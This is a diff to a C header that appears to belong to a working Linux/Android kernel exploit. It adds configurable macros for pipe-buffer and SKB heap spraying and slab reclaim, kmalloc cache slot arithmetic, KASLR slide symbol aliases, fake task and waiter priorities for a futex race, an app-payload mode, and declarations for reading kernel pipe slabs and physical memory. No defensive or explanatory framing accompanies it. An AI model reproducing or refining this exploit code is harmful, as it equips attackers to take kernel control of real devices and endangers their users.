@@ -5,6 +5,22 @@
 
 #include "offset.h"
 
+#ifndef RMG_BUILD_ID
+#define RMG_BUILD_ID BUILD_VARIANT_LABEL
+#endif
+
+/* Compatibility aliases for profiles using the original slide symbol names. */
+#if defined(SLIDE_NFULNL_LOGGER_IMAGE) && \
+    !defined(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE SLIDE_NFULNL_LOGGER_IMAGE
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE SLIDE_NFULNL_LOGGER_IMAGE
+#endif
+#if defined(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE) && \
+    !defined(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
+  SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
+#endif
+
 #define PAGE_SHIFT 12
 #define PAGE_SIZE (1UL << PAGE_SHIFT)
 #define KS_PAGE_SIZE 4096
@@ -15,6 +31,7 @@
 #include <fcntl.h>
 #include <linux/futex.h>
 #include <linux/memfd.h>
+#include <poll.h>
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
@@ -48,11 +65,18 @@
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
 #endif
 #else
+#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
+#endif
+#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
+#endif
 #endif
 #ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
+#endif
+#ifndef MM_PREPARE_SLABS
+#define MM_PREPARE_SLABS 32
 #endif
 
 #define ASHMEM_NAME_LEN 256
@@ -71,6 +95,12 @@
 #ifndef KERNELSNITCH_MTE_ENABLED
 #define KERNELSNITCH_MTE_ENABLED 0
 #endif
+#if (!defined(APP_PAYLOAD) || !APP_PAYLOAD) && \
+    defined(STANDALONE_KERNELSNITCH_MTE_ENABLED)
+#define KERNELSNITCH_ACTIVE_MTE_ENABLED STANDALONE_KERNELSNITCH_MTE_ENABLED
+#else
+#define KERNELSNITCH_ACTIVE_MTE_ENABLED KERNELSNITCH_MTE_ENABLED
+#endif
 #define MM_PARTIALS 5
 #define CORE 0
 #ifndef KSNITCH_COLLISIONS
@@ -80,7 +110,12 @@
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#ifndef SKB_RECLAIM_SENDS
 #define SKB_RECLAIM_SENDS 4
+#endif
+#ifndef FOPS_SKB_RECLAIM_SENDS
+#define FOPS_SKB_RECLAIM_SENDS SKB_RECLAIM_SENDS
+#endif
 #ifndef APP_SLIDE_RECLAIM_SENDS
 #define APP_SLIDE_RECLAIM_SENDS 16
 #endif
@@ -90,6 +125,9 @@
 #define FAKE_TASK_PRIO 120
 #ifndef FAKE_WAITER_PRIO
 #define FAKE_WAITER_PRIO 130
+#endif
+#ifndef FOPS_FAKE_WAITER_PRIO
+#define FOPS_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
 #endif
 #ifndef SLIDE_FAKE_WAITER_PRIO
 #define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
@@ -103,7 +141,9 @@
 #ifndef KMALLOC_CGROUP_TYPE
 #define KMALLOC_CGROUP_TYPE 2
 #endif
+#ifndef KMALLOC_PIPE_INDEX
 #define KMALLOC_PIPE_INDEX 11
+#endif
 #ifndef KMALLOC_CACHE_TYPES
 #define KMALLOC_CACHE_TYPES 4
 #endif
@@ -112,19 +152,31 @@
   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
 #define KMALLOC_CGROUP_PIPE_SLOT \
   KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
+#ifndef KMALLOC_PIPE_OBJ_SIZE
 #define KMALLOC_PIPE_OBJ_SIZE 0x800
+#endif
 
 #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
 #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
 
 #define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
 #define PIPE_SCAN_CHUNK 0x400
+#ifndef PIPE_OBJS_PER_SLAB
 #define PIPE_OBJS_PER_SLAB 16
+#endif
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
+#ifndef PIPE_MIN_PARTIAL
 #define PIPE_MIN_PARTIAL 5
+#endif
+#ifndef PIPE_CPU_PARTIAL
 #define PIPE_CPU_PARTIAL 2
+#endif
+#ifndef PIPE_DRAIN_SLABS
 #define PIPE_DRAIN_SLABS 15
+#endif
+#ifndef PIPE_RECLAIM_SLABS
 #define PIPE_RECLAIM_SLABS 15
+#endif
 #define PIPE_PARTIAL_GROUPS \
   ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
 #define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
@@ -135,10 +187,12 @@
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
+#ifndef PIPE_MAX_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PIPE_MAX_ATTEMPTS 1
 #else
 #define PIPE_MAX_ATTEMPTS 12
+#endif
 #endif
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
@@ -149,7 +203,13 @@
 #define CONSUMER_MAX_CALLS 1
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
+#ifndef PSELECT_CONSUMER_NICE_FIRST
+#define PSELECT_CONSUMER_NICE_FIRST PSELECT_CONSUMER_NICE
+#endif
 #define PSELECT_CONSUMER_BURST_CALLS 1
+#ifndef PSELECT_CONSUMER_SETTLE_USEC
+#define PSELECT_CONSUMER_SETTLE_USEC 0
+#endif
 #ifndef PSELECT_ENTER_DELAY_USEC
 #define PSELECT_ENTER_DELAY_USEC 50000
 #endif
@@ -244,14 +304,40 @@ extern atomic_int owner_started;
 extern atomic_int owner_chain_done;
 extern atomic_int route_done;
 extern atomic_int waiter_tid;
+extern atomic_int waiter_wait_ret;
+extern atomic_int waiter_wait_errno;
+extern atomic_int main_requeue_ret;
+extern atomic_int main_requeue_errno;
 extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
+extern atomic_int consumer_ready;
+extern atomic_int consumer_seen_seq;
+extern atomic_int consumer_wake_ret;
+extern atomic_int consumer_wake_errno;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
+extern atomic_int consumer_last_errno;
+extern atomic_int consumer_last_ret;
+extern atomic_int consumer_last_tid;
+extern atomic_int consumer_last_nice;
+extern atomic_int consumer_nice_before;
+extern atomic_int consumer_nice_after;
 extern atomic_int main_route_delay_usec;
 extern atomic_int cfi_stage_done;
+extern atomic_int cfi_safe_hold_required;
+#define EXPLOIT_SAFETY_CLEAN 0
+#define EXPLOIT_SAFETY_MUTATING 1
+#define EXPLOIT_SAFETY_HOLD 2
+extern atomic_int *exploit_safety_shared;
+void mark_exploit_safety(int state);
+#define PIPE_PREPARE_IDLE 0
+#define PIPE_PREPARE_PENDING 1
+#define PIPE_PREPARE_READY 2
+#define PIPE_PREPARE_CLEAN_MISS 3
+#define PIPE_PREPARE_UNCERTAIN 4
 extern atomic_int pipe_prepare_request;
 extern atomic_int pipe_prepare_done;
+extern atomic_int pipe_prepare_status;
 extern ssize_t cfi_write_ret;
 extern ssize_t cfi_read_ret;
 extern ssize_t cfi_read_slot_ret;
@@ -424,6 +510,7 @@ uintptr_t page_to_direct(uintptr_t page);
 uintptr_t pipe_buf_ops_addr(void);
 int pipe_cache_matches(uint64_t slab_cache);
 int pipe_reclaim_cache_gate(int fd);
+int restore_pipe_usercopy_cache(int fd);
 int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab);
 int find_pipe_buffer(int fd, uintptr_t base);
 int pipe_phys_read(
